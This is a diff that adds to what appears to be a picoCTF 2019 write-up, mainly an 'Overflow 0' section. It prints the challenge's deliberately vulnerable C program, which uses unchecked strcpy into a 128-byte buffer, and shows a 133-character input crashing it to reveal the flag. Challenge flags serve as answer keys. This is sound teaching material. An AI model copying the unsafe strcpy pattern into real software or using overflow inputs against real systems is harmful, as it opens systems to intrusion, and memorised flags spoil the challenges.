@@ -25,7 +25,7 @@ picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}
 ```
 Flag:```picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}```
 <br>
-<center><h2>practice-run-1</h2></center>
+<center><h2>practice-run-1 [50]</h2></center>
 <br>
 Q: You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this *[program](/picoctf2019/files/run_this)* to receive a flag.
 
@@ -42,4 +42,60 @@ picoCTF{g3t_r3adY_2_r3v3r53}
 picoCTF{g3t_r3adY_2_r3v3r53}
 ```
 Flag:```picoCTF{g3t_r3adY_2_r3v3r53}```
+<br>
+<center><h2>Overflow 0 [100]</h2></center>
+<br>
+Q: This should be easy. Overflow the correct buffer in this *[program](/picoctf2019/files/overflow0Vuln)* and get a flag. Its also found in /problems/overflow-0_3_dc6e55b8358f1c82f03ddd018a5549e0 on the shell server. *[Source](/picoctf2019/files/overflow0Vuln.c)*.
+
+A: So this problem is actually very basic buffer overflow. Looking at the code we see that in the ```vuln``` function the ```buf``` variable was given 128 bytes of memory.
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+
+#define FLAGSIZE_MAX 64
+
+char flag[FLAGSIZE_MAX];
+
+void sigsegv_handler(int sig) {
+  fprintf(stderr, "%s\n", flag);
+  fflush(stderr);
+  exit(1);
+}
+
+void vuln(char *input){
+  char buf[128];
+  strcpy(buf, input);
+}
+
+int main(int argc, char **argv){
+
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
+    exit(0);
+  }
+  fgets(flag,FLAGSIZE_MAX,f);
+  signal(SIGSEGV, sigsegv_handler);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  if (argc > 1) {
+    vuln(argv[1]);
+    printf("You entered: %s", argv[1]);
+  }
+  else
+    printf("Please enter an argument next time\n");
+  return 0;
+}
+```
+Knowing this, if we input the program more data than it can handle it will cause it to spit out the flag. You could just enter 500 characters and be done with it but the exact number is 133 characters. The reason it is 133 and not 128 is simple. The program allocated 128 bytes of memory for the input but thats not all we have to overwrite. We also have to overwrite the memory address which on 32 bit architectures are 4 bytes long. So, 128 + 4 = 132 and we need to be greater than which is why 133 is the smallest number that can cause a buffer overflow.
+```
+# python -c 'print("A" * 133)' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+picoCTF{3asY_P3a5y1fcf81f9}
+```
+Flag:```picoCTF{3asY_P3a5y1fcf81f9}```
 <br>
